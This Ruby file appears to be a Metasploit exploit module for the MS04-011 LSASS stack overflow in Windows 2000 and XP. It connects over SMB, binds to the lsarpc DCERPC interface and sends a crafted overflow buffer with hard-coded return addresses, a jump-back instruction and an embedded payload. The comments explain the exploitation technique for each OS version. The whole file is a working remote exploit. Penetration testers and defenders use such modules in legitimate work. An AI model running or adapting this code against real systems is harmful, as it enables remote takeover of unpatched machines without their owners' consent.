require 'msf/core'

module Msf

class Exploits::Windows::Smb::MS04_011_LSASS < Msf::Exploit::Remote

	#
	# This module exploits a vulnerability in the LSASS service
	#
	
	include Exploit::Remote::DCERPC
	include Exploit::Remote::SMB
	
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the LSASS service, this vulnerability
				was originally found by eEye. When re-exploiting a Windows XP system, you will need
				need to run this module twice. DCERPC request fragmentation can be performed by setting
				'FragSize' parameter.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '10108' ],
					[ 'CVE', '2003-0533' ],
					[ 'OSVDB', '5248'     ],
					[ 'MSB',   'MS04-011' ],
					[ 'MIL',   '36' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					# Automatic
					[ 
						'Automatic Targetting',
						{
							'Rets'     => [ ],
						},
					],
					# Windows 2000
					[ 
						'Windows 2000 English',
						{
							'Rets'     => [ 0x773242e0 ],
						},
					],
					# Windows XP
					[ 
						'Windows XP English',
						{
							'Rets'     => [ 0x7449bf1a ],
						},
					],										
				],
			'DefaultTarget' => 0))
	end
	
	def exploit

		connect()
		smb_login()

		handle = dcerpc_handle('3919286a-b10c-11d0-9ba8-00c04fd92ef5', '0.0', 'ncacn_np', ['\lsarpc'])
		print_status("Binding to #{handle}...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle}...")

		print_status('Getting OS information...')
		
		# Check the remote OS name and version
		os = smb_peer_lm
		string = ''
		case os
			# Windows 2000 requires that the string be unicode formatted
			# and give us a nice set of registers which point back to
			# the un-unicoded data. We simply return to a nop sled that
			# jumps over the return address, some trash, and into the
			# final payload. Easy as pie.		
			when /Windows 5\.0/
				str = Rex::Text.rand_text_alphanumeric(3500)
				str[2020, 4] = [targets[1]['Rets'][0]].pack('V')
				str[2104, payload.encoded.length ] = payload.encoded
				string = NDR.UnicodeConformantVaryingString(str)
			# Windows XP is a bit different, we need to use an ascii
			# buffer and a jmp esp. The esp register points to an
			# eight byte segment at the end of our buffer in memory,
			# we make these bytes jump back to the beginning of the
			# buffer, giving us about 1936 bytes of space for a
			# payload.				
			when /Windows 5\.1/
				str = Rex::Text.rand_text_alphanumeric(7000)
				str[0, payload.encoded.length ] = payload.encoded
				str[1964, 4] = [targets[2]['Rets'][0]].pack('V')
				str[1980, 5] = "\xe9\x3f\xf8\xff\xff" # jmp back to payload
				string = str
			when
				print_status("No target is available for #{ os }")
				return
		end

		stub = string + 
			NDR.long(rand(0xFFFFFF)) + 
			NDR.UnicodeConformantVaryingString('') +
			NDR.UnicodeConformantVaryingString('') +
			NDR.UnicodeConformantVaryingString('') +
			NDR.UnicodeConformantVaryingString('') +
			NDR.long(rand(0xFFFFFF)) + 
			NDR.UnicodeConformantVaryingString('') +
			NDR.long(rand(0xFFFFFF)) + 
			NDR.UnicodeConformantVaryingString('') +
			NDR.long(rand(0xFFFFFF)) + 
			NDR.UnicodeConformantVaryingString('') +
			Rex::Text.rand_text(528) + 
			Rex::Text.rand_text(528) + 
			NDR.long(rand(0xFFFFFF))

		print_status("Trying to exploit #{os}")
		
		begin
			response = dcerpc_call(9, stub)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			print_status('Server did not respond, but that should be ok...')
		rescue Rex::Proto::DCERPC::Exceptions::Fault
			case $!.fault
			when 0x1c010002
				print_status('Server appears to have been patched')
			else
				print_status("Unexpected DCERPC fault 0x%.8x" % $!.fault)
			end
		end

		# Perform any required client-side payload handling
		handler
	end
end

end
